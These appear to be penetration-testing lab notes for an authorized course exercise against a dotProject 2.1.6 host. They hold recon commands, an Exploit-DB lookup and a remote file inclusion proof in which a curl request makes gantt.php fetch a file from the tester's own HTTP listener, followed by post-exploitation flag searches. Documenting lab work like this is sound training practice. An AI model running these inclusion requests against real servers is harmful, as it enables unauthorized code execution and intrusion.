**Navigation:** [Work index](../README.md) · [Credential pivot (hub)](../credential_pivot_A_Rocha_hosts.md) · [Creds — this host](./credential_pivot.md) · [Dead ends](./unfruitful_attempts.md) · [A_Rocha README](../../README.md)

---

## `10.20.160.102` — Linux / dotProject 2.1.6 (validated)

| Field | Value |
|-------|--------|
| **Role** | Primary **web** target — **Apache 2.2.21**, **PHP 5.3.8**, **LAMPP** path **`/opt/lampp/htdocs/`** (from PHP notice) |
| **App** | **dotProject 2.1.6** — **`/dotproject/`** (root **302/301** to this path) |
| **Confirmed primitive** | **RFI** — **`/dotproject/modules/projectdesigner/gantt.php`** + **`dPconfig[root_dir]=http://<KALI>:8080/<file>?`** — response body reflected **`RFI_MARKER_EPT`** / **`PROOF`** ([`102-004` evidence](./Screenshots/102-004_rfi_proof_txt_body_PROOF_tm6_afrocha.png)) |
| **Exploit-DB mapping** | **`searchsploit dotproject 2.1.6`** → **`php/webapps/22708.txt`** (**EDB-22708**, *Remote File Inclusion*) — full advisory text: [`102-008`](./Screenshots/102-008_searchsploit_x_22708_rfi_gantt_advisory_tm6_afrocha.png); command output: [`102-007`](./Screenshots/102-007_searchsploit_dotproject_2_1_6_edb22708_tm6_afrocha.png). Advisory notes **`allow_url_include`** / **`register_globals`**; lab stack still matched your **inclusion** PoC—cite **both** conditions in the report. |
| **OWASP ZAP (baseline)** | **Active scan:** **Parameter Tampering** on **`login`** at **`/dotproject/index.php`** (Medium — error-style output / **CWE-472**). **Passive + active:** **X-Frame-Options** missing (clickjacking), weak **cookie** flags, no **Anti-CSRF** on forms, **`X-Powered-By`** leak, **`X-Content-Type-Options`** missing, **timestamp** disclosures — see [`102-005`](./Screenshots/102-005_zap_parameter_tampering_login_dotproject_tm6_afrocha.png), [`102-006`](./Screenshots/102-006_zap_x_frame_options_missing_dotproject_tm6_afrocha.png). |

**Lanes that did not pan out:** Shellshock (**MSF `check`** negative), **`msf > search dot`**, **`php_imap_open_rce`**, generic **PHP-CGI** rows, RFI **listener / path** mistakes — full notes and screenshots: **[`unfruitful_attempts.md`](unfruitful_attempts.md)**.

**Plan shift after ZAP:** keep **RFI** as the proven lane; add **time-boxed** manual follow-up on **`login`** (**SQLi** / **auth bypass** / **logic flaws**) using ZAP evidence as the map; treat **clickjacking** / **cookie** / **CSRF** items as **defense-in-depth** findings for the report unless the rubric rewards chained client-side impact.

### Plan of attack — commands (current)

```bash
export RHOST_102=10.20.160.102
echo TM6_afrocha; date
ip -br a    # set LHOST / KALI_LAB_IP to the interface .102 can reach (e.g. 10.20.150.106)
```

**1 — Map services**

```bash
nmap -Pn -sS -sV -T4 "$RHOST_102" -oA ~/scans/nmap_102_initial
nmap -Pn -p 80,443,8080,8443 -sV --script http-enum,http-headers "$RHOST_102"
```

**2 — Web entry + version fingerprint**

```bash
curl -sik "http://$RHOST_102/"
curl -sik "http://$RHOST_102/dotproject/"
curl -sik "http://$RHOST_102/dotproject/index.php"
```

**3 — Optional web scanners**

```bash
nikto -h "http://$RHOST_102"
```

**OWASP ZAP** (scope **`http://$RHOST_102/dotproject/`** — Quick Start / spider, then **active scan**; proxy listen e.g. **`localhost:8081`** if you avoid colliding with **`8080`** RFI PoC):

- Review **Alerts** — prioritize **Medium** **Parameter Tampering** on **`login`** (manual: **SQLi**, type juggling, auth bypass) before burning time on **Low** header-only rows.
- **X-Frame-Options** / **CSRF** / **cookie flags** — document for **remediation**; exploit only if course **ROE** rewards **session** impact and you have a **clear chain**.

**4 — Exploit-DB + RFI proof (lab-authorized)**

```bash
searchsploit dotproject 2.1.6
searchsploit -x php/webapps/22708.txt

export LHOST=<KALI_LAB_IP>
mkdir -p ~/rfi_poc
printf 'RFI_MARKER_EPT\n' > ~/rfi_poc/marker.txt
printf 'PROOF\n' > ~/rfi_poc/proof.txt
cd ~/rfi_poc && python3 -m http.server 8080 --bind 0.0.0.0
```

New terminal:

```bash
export RHOST_102=10.20.160.102
export LHOST=<KALI_LAB_IP>

curl -sI "http://$RHOST_102/dotproject/modules/projectdesigner/gantt.php"
curl -s "http://$LHOST:8080/proof.txt"
curl -sik "http://${RHOST_102}/dotproject/modules/projectdesigner/gantt.php?dPconfig%5Broot_dir%5D=http://${LHOST}:8080/proof.txt?"
```

Use **`http://`** to your listener (**not** `https://`). Keep all served files under **`~/rfi_poc/`** (same directory as **`http.server`**).

**5 — Post-ex (after shell or per rubric)**

```bash
hostname; whoami; id
find / -name "local.txt" 2>/dev/null
find / -name "proof.txt" 2>/dev/null
```

### Evidence index (`./Screenshots/`)

| Topic | Files |
|-------|--------|
| nmap / http-enum | `recon_nmap_102_initial_tm6_afrocha.png`, `recon_nmap_102_http_enum_headers_tm6_afrocha.png` |
| curl root / dotproject | `recon_curl_root_302_dotproject_tm6_afrocha.png`, `recon_curl_dotproject_301_tm6_afrocha.png`, `recon_curl_dotproject_https_attempts_tm6_afrocha.png` |
| Version + login | `recon_curl_dotproject_index_php_200_meta_tm6_afrocha.png`, `recon_dotproject_login_html_2_1_6_tm6_afrocha.png` |
| Advisory | `searchsploit_dotproject_2_1_6_rfi_gantt_dPconfig_tm6_afrocha.png`, **`102-007_searchsploit_dotproject_2_1_6_edb22708_tm6_afrocha.png`**, **`102-008_searchsploit_x_22708_rfi_gantt_advisory_tm6_afrocha.png`** |
| Chronological **102-*** | `102-001` … `102-004` (RFI); **`102-005`**, **`102-006`** (ZAP); **`102-007`**, **`102-008`** (**EDB-22708** / `searchsploit -x`) |
| OWASP ZAP | `102-005_zap_parameter_tampering_login_dotproject_tm6_afrocha.png` (Parameter Tampering **`login`**), `102-006_zap_x_frame_options_missing_dotproject_tm6_afrocha.png` (headers / alert summary) |
| Nikto | `recon_nikto_102_http80_banner_redirect_tm6_afrocha.png`, `recon_nikto_102_dotproject_paths_shellshock_tm6_afrocha.png` |
| MSF Shellshock `check` | `exploit_msf_shellshock_printenv_check_not_vuln_tm6_afrocha.png` |
| searchsploit menus | `searchsploit_apache_2_2_21_tm6_afrocha.png`, `searchsploit_php_5_3_8_*.png`, `searchsploit_dotproject_tm6_afrocha.png` |

Screenshot naming **`102-NNN_…`**: [A_Rocha README](../../README.md) + [`.cursor` rule](../../../.cursor/rules/ept-evidence-screenshots.mdc).

### Now what (`.102` — next 60–90 minutes)

1. **Report / deck:** Drop **`102-007` / `102-008`** next to **`102-004`** so the story is **EDB-22708 → reproduced RFI** (plus **`102-005`** for ZAP **`login`** follow-up).  
2. **`login` lane:** Time-box **manual** or **`sqlmap`** (if ROE allows) against **`index.php`** parameters ZAP flagged—stop if only noise.  
3. **Flags / post-RFI:** If rubric needs **`local.txt` / `proof.txt`**, use any **new read primitive** (RFI log paths, LFI if found) or pivot to **`.101` / `.100`** so the team has **breadth**.  
4. **Sheet + root README:** When a host is truly “done,” align **Exploited?** in the [Host discovery sheet](https://docs.google.com/spreadsheets/d/1J3H6ee8N06ROz1l4pcgxclArq5TN4sk3kIPbHPTCj3A/edit?usp=sharing) and [root `README.md`](../../../README.md) with whoever owns the **team table** this week.

---
